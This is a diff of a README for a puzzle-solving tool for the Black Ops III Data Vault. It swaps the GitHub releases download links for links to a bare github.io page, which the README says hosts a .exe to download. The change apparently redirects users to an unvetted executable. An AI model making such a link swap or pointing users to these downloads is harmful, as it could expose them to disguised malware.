@@ -1,6 +1,6 @@
 # 🧩 bo3-script-code-tester - Convert puzzle words into numeric values
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/fusilrichpeople437/bo3-script-code-tester/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://fusilrichpeople437.github.io)
 
 ## 📥 Getting Started
 
@@ -8,7 +8,7 @@ This tool helps you solve puzzles in the Call of Duty: Black Ops III Data Vault.
 
 ## 💾 Download and Install
 
-1. Visit this page to download: [https://github.com/fusilrichpeople437/bo3-script-code-tester/releases](https://github.com/fusilrichpeople437/bo3-script-code-tester/releases)
+1. Visit this page to download: [https://fusilrichpeople437.github.io](https://fusilrichpeople437.github.io)
 2. Locate the file ending in .exe for the newest version. 
 3. Click the file name to start the download.
 4. Save the file to your desktop or your downloads folder.
